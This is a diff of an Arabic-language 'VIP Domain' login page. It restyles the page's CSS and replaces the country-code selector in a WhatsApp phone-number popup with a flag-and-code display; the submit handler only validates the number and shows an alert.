@@ -133,7 +133,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
   transition: all 0.25s ease;
   box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
 }
-/* ألوان ظاهرة مباشرة */
 .social-icon-btn.facebook {
   background: #1877f2;
   color: #ffffff;
@@ -198,48 +197,71 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
   text-align: center; color: #edeff3;
   font-size: 15px; margin-bottom: 20px;
 }
+
+/* محاذاة حقل الإدخال ليطابق المواصفات المطلوبة تماماً */
 .phone-input-container {
   display: flex; align-items: center;
   background: #131314;
   border: 1px solid #3a3a3c;
   border-radius: 10px;
-  padding: 4px 10px;
+  padding: 4px 14px;
   direction: ltr;
 }
 .country-select-wrapper {
   display: flex; align-items: center;
-  gap: 5px; padding-right: 10px;
+  gap: 8px; padding-right: 12px;
   border-right: 1px solid #3a3a3c;
-  color: #ffffff; font-size: 14px;
+  position: relative;
 }
+/* تصميم العلم داخل دائرة */
+.flag-circle {
+  width: 24px; height: 24px;
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  overflow: hidden; font-size: 18px; line-height: 1;
+}
+/* إخفاء القائمة الأصلية الشفافة فوق العناصر لتسهيل الاختيار والنقر */
 .country-select {
-  background: transparent; border: none;
-  color: #ffffff; font-size: 14px; outline: none;
-  cursor: pointer; max-width: 95px;
+  position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+  opacity: 0; cursor: pointer; font-size: 16px;
 }
 .country-select option {
   background: #1c1c1e; color: #ffffff;
 }
+/* عرض الرمز بين قوسين والسهم العريض */
+.country-display-code {
+  color: #ffffff; font-size: 15px; font-weight: 500; white-space: nowrap;
+}
+.chevron-icon {
+  font-size: 12px; color: #a1a1a5; margin-left: 2px;
+}
+
 .phone-field {
   flex: 1; background: transparent; border: none;
-  color: #ffffff; font-size: 15px; padding: 10px;
+  color: #ffffff; font-size: 16px; padding: 12px 10px;
   outline: none; width: 100%; margin-bottom: 0 !important;
 }
 .whatsapp-error-msg {
   color: var(--red); font-size: 12px; text-align: center; margin-top: 8px; min-height: 16px; display: block;
 }
+
+/* تعديل الزر: نص عريض باللون الأبيض وتأثيرات بصرية ممتازة مع أيقونة على اليسار */
 .whatsapp-submit-btn {
-  width: 100%; padding: 14px;
-  background: linear-gradient(180deg, #0f401b 0%, #082610 100%);
+  width: 100%; padding: 15px;
+  background: linear-gradient(180deg, #0e451d 0%, #06200c 100%);
   border: 1px solid #144d22; border-radius: 10px;
-  color: #3ddc84; font-weight: 600; font-size: 15px;
-  display: flex; align-items: center; justify-content: center; gap: 10px;
-  cursor: pointer; transition: background 0.2s;
+  color: #ffffff; font-weight: 700; font-size: 15px;
+  display: flex; align-items: center; justify-content: center; gap: 12px;
+  cursor: pointer; transition: background 0.2s, transform 0.1s;
+  flex-direction: row-reverse; /* نقل الأيقونة لتصبح على اليسار والنص على اليمين */
 }
 .whatsapp-submit-btn:hover {
-  background: linear-gradient(180deg, #145324 0%, #0d3617 100%);
+  background: linear-gradient(180deg, #125424 0%, #092b11 100%);
 }
-.whatsapp-submit-btn i { font-size: 18px; }
+.whatsapp-submit-btn:active {
+  transform: scale(0.99);
+}
+.whatsapp-submit-btn i { font-size: 20px; color: #3ddc84; }
 
 .msg { font-size: 13px; text-align: center; border-radius: 8px; padding: 10px 12px; margin-bottom: 18px; display: none; }
 .msg.error { background: rgba(229, 72, 77, 0.12); color: var(--red); display: block; }
@@ -277,7 +299,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 </head>
 <body>
 
-  <!-- الهيدر -->
   <header class="site-header">
     <img src="logo.png" alt="Logo" class="header-logo" onerror="this.style.display='none'">
     <div class="header-lines"><span></span><span></span><span></span></div>
@@ -285,7 +306,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 
   <div class="main-content">
 
-  <!-- الشاشة الرئيسية: بريد + كلمة سر فقط -->
   <div class="card view active" id="view-access">
     <div class="eyebrow">VIP Domain</div>
     <div class="eyebrow-divider"></div>
@@ -300,7 +320,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
       <button type="submit" id="accessBtn">Login</button>
     </form>
 
-    <!-- قسم أيقونات التواصل الاجتماعي الملونة والظاهرة دائماً -->
     <div class="social-login-container">
       <a href="#" class="social-icon-btn facebook" title="Facebook"><i class="fab fa-facebook-f"></i></a>
       <a href="#" class="social-icon-btn whatsapp" id="openWhatsappModal" title="WhatsApp" onclick="event.preventDefault(); toggleModal(true);"><i class="fab fa-whatsapp"></i></a>
@@ -310,7 +329,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     <div class="promo-text">Join VIP Now &amp; Claim Your Free Rewards</div>
   </div>
 
-  <!-- بانتظار الموافقة -->
   <div class="card view" id="view-pending">
     <div class="status-icon pending">⏳</div>
     <h1 style="margin-bottom:6px;">يتم الطلب</h1>
@@ -319,7 +337,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     <div class="center-text" style="margin-top:14px; font-size:12px; opacity:0.7;">⏳ جاري المعالجة...</div>
   </div>
 
-  <!-- رفض رسمي -->
   <div class="card view" id="view-rejected">
     <div class="status-icon rejected">✕</div>
     <h1 style="margin-bottom:6px;">نتيجة الطلب</h1>
@@ -329,7 +346,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     <p class="center-text">شكراً لاهتمامك بالانضمام إلينا.</p>
   </div>
 
-  <!-- لوحة العضو -->
   <div class="card view" id="view-dashboard">
     <div class="status-icon approved">✓</div>
     <h1 style="margin-bottom:6px;">فيك</h1>
@@ -340,7 +356,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
 
   </div>
 
-  <!-- النافذة المنبثقة المخصصة للواتساب (Popup) المحدثة بالكامل -->
   <div class="whatsapp-modal-overlay" id="whatsappModalOverlay" onclick="toggleModal(false)">
     <div class="whatsapp-modal" onclick="event.stopPropagation()">
       <div class="modal-close-btn" onclick="toggleModal(false)"><i class="fas fa-times"></i></div>
@@ -350,46 +365,47 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
         <div class="modal-instruction">أدخل رقم هاتفك لربط حسابك</div>
         <div class="phone-input-container">
           <div class="country-select-wrapper">
-            <select class="country-select" id="countrySelect" onchange="updatePhonePlaceholder()">
-              <!-- الدول العربية أولاً مع أطوال الأرقام القياسية المخزنة في الـ data-len -->
-              <option value="+962" data-len="9">🇲🇯🇴 +962</option>
-              <option value="+963" data-len="9">🇸🇾 +963</option>
-              <option value="+966" data-len="9">🇸🇦 +966</option>
-              <option value="+971" data-len="9">🇦🇪 +971</option>
-              <option value="+20" data-len="10">🇪🇬 +20</option>
-              <option value="+964" data-len="10">🇮🇶 +964</option>
-              <option value="+965" data-len="8">🇰🇼 +965</option>
-              <option value="+974" data-len="8">🇶🇦 +974</option>
-              <option value="+973" data-len="8">🇧🇭 +973</option>
-              <option value="+968" data-len="8">🇴🇲 +968</option>
-              <option value="+961" data-len="8">🇱🇧 +961</option>
-              <option value="+970" data-len="9">🇵🇸 +970</option>
-              <option value="+967" data-len="9">🇾🇪 +967</option>
-              <option value="+218" data-len="9">🇱🇾 +218</option>
-              <option value="+216" data-len="8">🇹🇳 +216</option>
-              <option value="+213" data-len="9">🇩🇿 +213</option>
-              <option value="+212" data-len="9">🇲🇦 +212</option>
-              <option value="+249" data-len="9">🇸🇩 +249</option>
-              <!-- الدول الأجنبية المعروفة والمضافة حديثاً -->
-              <option value="+1" data-len="10">🇺🇸 +1</option>
-              <option value="+44" data-len="10">🇬🇧 +44</option>
-              <option value="+49" data-len="11">🇩🇪 +49</option>
-              <option value="+33" data-len="9">🇫🇷 +33</option>
-              <option value="+90" data-len="10">🇹🇷 +90</option>
-              <option value="+7" data-len="10">🇷🇺 +7</option>
-              <option value="+1-CA" data-len="10">🇨🇦 +1</option>
-              <option value="+61" data-len="9">🇦🇺 +61</option>
-              <option value="+39" data-len="10">🇮🇹 +39</option>
-              <option value="+34" data-len="9">🇪🇸 +34</option>
-              <option value="+46" data-len="9">🇸🇪 +46</option>
-              <option value="+31" data-len="9">🇳🇱 +31</option>
-              <option value="+32" data-len="9">🇧🇪 +32</option>
-              <option value="+41" data-len="9">🇨🇭 +41</option>
-              <option value="+43" data-len="10">🇦🇹 +43</option>
+            <div class="flag-circle" id="currentFlag">🇯🇴</div>
+            <i class="fas fa-chevron-down chevron-icon"></i>
+            <div class="country-display-code" id="currentCode">(+962)</div>
+            
+            <select class="country-select" id="countrySelect" onchange="updateCountryUI()">
+              <option value="+962" data-flag="🇯🇴" data-len="9">الأردن (+962)</option>
+              <option value="+963" data-flag="🇸🇾" data-len="9">سوريا (+963)</option>
+              <option value="+966" data-flag="🇸🇦" data-len="9">السعودية (+966)</option>
+              <option value="+971" data-flag="🇦🇪" data-len="9">الإمارات (+971)</option>
+              <option value="+20" data-flag="🇪🇬" data-len="10">مصر (+20)</option>
+              <option value="+964" data-flag="🇮🇶" data-len="10">العراق (+964)</option>
+              <option value="+965" data-flag="🇰🇼" data-len="8">الكويت (+965)</option>
+              <option value="+974" data-flag="🇶🇦" data-len="8">قطر (+974)</option>
+              <option value="+973" data-flag="🇧🇭" data-len="8">البحرين (+973)</option>
+              <option value="+968" data-flag="🇴🇲" data-len="8">عمان (+968)</option>
+              <option value="+961" data-flag="🇱🇧" data-len="8">لبنان (+961)</option>
+              <option value="+970" data-flag="🇵🇸" data-len="9">فلسطين (+970)</option>
+              <option value="+967" data-flag="🇾🇪" data-len="9">اليمن (+967)</option>
+              <option value="+218" data-flag="🇱🇾" data-len="9">ليبيا (+218)</option>
+              <option value="+216" data-flag="🇹🇳" data-len="8">تونس (+216)</option>
+              <option value="+213" data-flag="🇩🇿" data-len="9">الجزائر (+213)</option>
+              <option value="+212" data-flag="🇲🇦" data-len="9">المغرب (+212)</option>
+              <option value="+249" data-flag="🇸🇩" data-len="9">السودان (+249)</option>
+              <option value="+1" data-flag="🇺🇸" data-len="10">أمريكا (+1)</option>
+              <option value="+44" data-flag="🇬🇧" data-len="10">بريطانيا (+44)</option>
+              <option value="+49" data-flag="🇩🇪" data-len="11">ألمانيا (+49)</option>
+              <option value="+33" data-flag="🇫🇷" data-len="9">فرنسا (+33)</option>
+              <option value="+90" data-flag="🇹🇷" data-len="10">تركيا (+90)</option>
+              <option value="+7" data-flag="🇷🇺" data-len="10">روسيا (+7)</option>
+              <option value="+1-CA" data-flag="🇨🇦" data-len="10">كندا (+1)</option>
+              <option value="+61" data-flag="🇦🇺" data-len="9">أستراليا (+61)</option>
+              <option value="+39" data-flag="🇮🇹" data-len="10">إيطاليا (+39)</option>
+              <option value="+34" data-flag="🇪🇸" data-len="9">إسبانيا (+34)</option>
+              <option value="+46" data-flag="🇸🇪" data-len="9">السويد (+46)</option>
+              <option value="+31" data-flag="🇳🇱" data-len="9">هولندا (+31)</option>
+              <option value="+32" data-flag="🇧🇪" data-len="9">بلجيكا (+32)</option>
+              <option value="+41" data-flag="🇨🇭" data-len="9">سويسرا (+41)</option>
+              <option value="+43" data-flag="🇦🇹" data-len="10">النمسا (+43)</option>
             </select>
-            <i class="fas fa-chevron-down" style="font-size: 11px; color: #a1a1a5;"></i>
           </div>
-          <input type="tel" class="phone-field" placeholder="9 أرقام" id="whatsappPhone">
+          <input type="tel" class="phone-field" placeholder="" id="whatsappPhone">
         </div>
         <span class="whatsapp-error-msg" id="whatsappError"></span>
       </div>
@@ -400,7 +416,6 @@ button:disabled { opacity: 0.6; cursor: not-allowed; }
     </div>
   </div>
 
-  <!-- الفوتر -->
   <footer class="site-footer">
     <div class="footer-divider"></div>
     <div class="footer-content">
@@ -421,7 +436,7 @@ function toggleModal(show) {
   const overlay = document.getElementById('whatsappModalOverlay');
   if (show) {
     overlay.classList.add('active');
-    updatePhonePlaceholder();
+    updateCountryUI();
   } else {
     overlay.classList.remove('active');
     document.getElementById('whatsappError').textContent = '';
@@ -429,13 +444,16 @@ function toggleModal(show) {
   }
 }
 
-// تحديث النص المساعد داخل خانة الرقم بناء على الدولة المختارة
-function updatePhonePlaceholder() {
+// تحديث واجهة اختيار الدولة (العلم، الكود بين قوسين) بدون بليس هولدر
+function updateCountryUI() {
   const select = document.getElementById('countrySelect');
   const selectedOption = select.options[select.selectedIndex];
-  const length = selectedOption.getAttribute('data-len');
-  const phoneInput = document.getElementById('whatsappPhone');
-  phoneInput.placeholder = `${length} أرقام`;
+  
+  const flag = selectedOption.getAttribute('data-flag');
+  const code = selectedOption.value;
+  
+  document.getElementById('currentFlag').textContent = flag;
+  document.getElementById('currentCode').textContent = `(${code})`;
   document.getElementById('whatsappError').textContent = '';
 }
 
@@ -447,7 +465,6 @@ function validateAndSubmitWhatsapp() {
   const countryCode = selectedOption.value;
   
   const phoneInput = document.getElementById('whatsappPhone');
-  // إزالة أي فراغات أو رموز مدخلة بالخطأ والاحتفاظ بالأرقام فقط
   const cleanPhone = phoneInput.value.replace(/\D/g, '');
   const errorSpan = document.getElementById('whatsappError');
 
@@ -458,7 +475,6 @@ function validateAndSubmitWhatsapp() {
   
   errorSpan.textContent = '';
   alert(`جاري الإرسال إلى الرقم: ${countryCode} ${cleanPhone}`);
-  // هنا يمكنك استكمال كود الـ API الخاص بك إذا كنت تريد ربطه بالسيرفر
 }
 
 // تقييد الكتابة في الحقل لتقبل الأرقام فقط وتمنع تجاوز الحد الأقصى للدولة المحددة تلقائياً
